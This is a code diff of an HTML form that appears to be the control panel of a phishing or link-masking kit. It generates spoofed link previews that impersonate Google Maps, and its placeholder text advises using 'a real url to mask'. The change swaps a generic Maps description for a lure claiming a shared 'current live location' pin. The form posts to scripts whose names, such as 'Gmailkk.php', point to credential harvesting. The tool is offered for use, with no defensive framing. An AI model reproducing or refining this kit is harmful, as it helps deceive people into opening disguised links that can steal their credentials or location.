@@ -94,10 +94,9 @@
 <body>
 
   
-<form id="accesspanel" action="/public/Google/meta/Gmailkk.php" method="POST">
+<form id="accesspanel" action="/public/Google/meta/create1.php" method="POST">
 <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
 	  
-
 
 
  <fieldset>
@@ -109,10 +108,10 @@
     
     <font size="12" color="white">FOREST GUMP</font><br>
 <font size="6" color="grey"><br>I THINK I <5 U GENNY</font>
-<input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.google.ca/maps/pla..." required="">
-<input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
-<input type="text" name="imagelink" id="imageurl" value="https://i.ibb.co/sgD4nM1/Untitled.png" placeholder="a 200x200 meta preview image url" required=""> <br>
-<input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Maps" required="">
+<input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.maps.google.ca/liveloca..." required>
+<input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Shared a Dropped pin showing current live location!">
+<input type="text" name="imagelink" id="imagelink" value="https://i.ibb.co/X3w2Gy7/current.png" placeholder="a 200x200 meta preview image url" required=""> <br>
+<input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Current Location" required="">
 <button type="submit" class="button">[RUN FOREST]</button>
 
 
